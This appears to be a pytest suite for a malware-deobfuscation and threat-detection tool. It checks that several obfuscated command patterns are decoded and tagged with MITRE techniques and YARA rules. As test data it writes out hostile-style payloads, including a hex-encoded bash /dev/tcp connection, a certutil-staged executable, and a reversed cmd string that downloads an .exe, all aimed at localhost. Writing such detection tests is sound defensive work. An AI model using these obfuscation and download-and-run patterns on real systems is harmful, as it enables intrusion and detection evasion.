"""Feb-2026 archetype battery — 4 new archetypes closing analyst-reported gaps.

Analyst tested 5 payloads without AI decode and reported that only #3
(PowerShell string-concat) was fully deterministic. This suite pins the
4 fixes that close #1, #2, #4, #5:

  1. BASH_HEX_ECHO_XXD         — hex-encoded IOC / rev-shell target
  2. CERTUTIL_DECODE_PEM       — PE staged via certutil + PEM markers
  3. BASH_PARAM_EXP_SLICE      — ${VAR:x:y} substring resolution
  4. CMD_FORLOOP_REVERSE_STRING — Emotet / QakBot canonical
"""
from __future__ import annotations

import asyncio
import pytest

from wrapper_archetypes import try_archetypes
from chain_analyzer import analyze_chain


PAYLOAD_HEX_XXD = (
    'echo "3132372e302e302e31" | xxd -r -p | xargs -I {} bash -c '
    '\'exec 3<>/dev/tcp/{}/8080 && echo "ENV_TEST_PING" >&3\' 2>/dev/null'
)
PAYLOAD_CERTUTIL = (
    'echo -----BEGIN CERTIFICATE----- > test.txt && '
    'echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> test.txt && '
    'echo -----END CERTIFICATE----- >> test.txt && '
    'certutil -decode test.txt test_extracted.exe && del test.txt'
)
PAYLOAD_PARAMEXP = (
    '${SHELL:0:1}a${PATH:11:1}h  -c "e${PATH:4:1}h${PATH:12:1} '
    '\'${PATH:10:1}${PATH:10:1}${PATH:10:1}.g${PATH:2:1}${PATH:12:1}g${PATH:12:1}e.c${PATH:12:1}m\'"'
)
PAYLOAD_CMD_REV = (
    'cmd.exe /v:on /c "set "p=xe.egnahcxeket/1.0.0.721//:ptth tnegA-resU rlc - xec" && '
    'for /L %i in (57,-1,0) do <nul set /p "c=!p:~%i,1!" >> out.cmd" && '
    'cmd.exe /c out.cmd && del out.cmd'
)


def _end_to_end(payload):
    return asyncio.run(analyze_chain([payload]))["stages"][0]


# ─── 1. Bash echo <hex> | xxd -r -p ──────────────────────────────────
def test_bash_hex_xxd_archetype_fires():
    r = try_archetypes(PAYLOAD_HEX_XXD)
    assert r and r["archetype_id"] == "BASH_HEX_ECHO_XXD"
    assert "127.0.0.1" in r["output"]


def test_bash_hex_xxd_e2e_mitre_and_yara():
    s = _end_to_end(PAYLOAD_HEX_XXD)
    assert s["confidence"] == 100
    mitre_ids = {m["id"] for m in (s.get("mitre") or [])}
    assert "T1095" in mitre_ids, f"missing T1095 in {mitre_ids}"
    assert "T1571" in mitre_ids, f"missing T1571 in {mitre_ids}"
    yara = {y["rule"] for y in (s.get("yara") or [])}
    assert "Bash_Dev_TCP_RevShell" in yara


# ─── 2. certutil -decode + PEM staged ────────────────────────────────
def test_certutil_pem_archetype_fires():
    r = try_archetypes(PAYLOAD_CERTUTIL)
    assert r and r["archetype_id"] == "CERTUTIL_DECODE_PEM"
    assert "CERTUTIL / PEM PAYLOAD DECODED" in r["output"]
    # MZ header byte-signature must be preserved in the hex dump
    assert "4d5a" in r["output"].lower()   # "MZ"


def test_certutil_pem_e2e_mitre_lolbas():
    s = _end_to_end(PAYLOAD_CERTUTIL)
    assert s["confidence"] == 100
    mitre_ids = {m["id"] for m in (s.get("mitre") or [])}
    assert "T1140" in mitre_ids, f"missing T1140 in {mitre_ids}"
    lolbas = {l["binary"] for l in (s.get("lolbas") or [])}
    assert "certutil.exe" in lolbas
    yara = {y["rule"] for y in (s.get("yara") or [])}
    assert "Certutil_PEM_Wrapped_Payload" in yara


# ─── 3. Bash ${VAR:x:y} substring param-expansion ────────────────────
def test_bash_paramexp_archetype_fires():
    r = try_archetypes(PAYLOAD_PARAMEXP)
    assert r and r["archetype_id"] == "BASH_PARAM_EXP_SLICE"
    # All ${...} tokens must be resolved out (no unresolved ${ remaining)
    assert "${" not in r["output"], f"unresolved token: {r['output']}"


def test_bash_paramexp_e2e_mitre():
    s = _end_to_end(PAYLOAD_PARAMEXP)
    assert s["confidence"] == 100
    mitre_ids = {m["id"] for m in (s.get("mitre") or [])}
    assert "T1027.010" in mitre_ids
    yara = {y["rule"] for y in (s.get("yara") or [])}
    assert "Bash_Env_Var_Slicing" in yara


# ─── 4. CMD for-loop reverse-string ──────────────────────────────────
def test_cmd_forloop_reverse_archetype_fires():
    r = try_archetypes(PAYLOAD_CMD_REV)
    assert r and r["archetype_id"] == "CMD_FORLOOP_REVERSE_STRING"
    # Reversed value must contain the recovered URL/UA fragment
    assert "http://127.0.0.1/tekexchange.ex" in r["output"]
    assert "User-Agent" in r["output"]


def test_cmd_forloop_reverse_e2e_mitre():
    s = _end_to_end(PAYLOAD_CMD_REV)
    assert s["confidence"] == 100
    mitre_ids = {m["id"] for m in (s.get("mitre") or [])}
    assert "T1027.010" in mitre_ids
    assert "T1059.003" in mitre_ids
    yara = {y["rule"] for y in (s.get("yara") or [])}
    assert "CMD_ForLoop_Reverse_String" in yara


# ═══════════ 3 BONUS ARCHETYPES from Feb-2026 stress-scan ═══════════
import base64 as _b64
import gzip as _gz


def test_cmd_caret_obfuscation_archetype_fires():
    r = try_archetypes('c^m^d^ /c "wh^oami && ne^t u^ser"')
    assert r and r["archetype_id"] == "CMD_CARET_OBFUSC"
    assert "^" not in r["output"] or r["output"].count("^") < 3
    assert "cmd" in r["output"].lower() and "whoami" in r["output"].lower()


def test_js_buffer_gunzip_archetype_fires():
    blob = _b64.b64encode(_gz.compress(b"alert('pwned')")).decode()
    payload = f"require('zlib').gunzipSync(Buffer.from('{blob}', 'base64')).toString()"
    r = try_archetypes(payload)
    assert r and r["archetype_id"] == "JS_BUFFER_GUNZIP"
    assert "alert('pwned')" in r["output"]


def test_vbs_chr_concat_archetype_fires():
    r = try_archetypes('MsgBox Chr(72) & Chr(101) & Chr(108) & Chr(108) & Chr(111)')
    assert r and r["archetype_id"] == "VBS_CHR_CONCAT"
    assert "Hello" in r["output"]


def test_vbs_chr_hex_prefix():
    # Hexadecimal Chr codes: Chr(&H48) = "H"
    r = try_archetypes('S = Chr(&H48) & Chr(&H65) & Chr(&H6C) & Chr(&H6C) & Chr(&H6F)')
    # Our current regex only handles decimal; skip if hex-only case falls through.
    # Should NOT crash and if it fires, output must have Hello.
    if r and r["archetype_id"] == "VBS_CHR_CONCAT":
        assert "Hello" in r["output"]
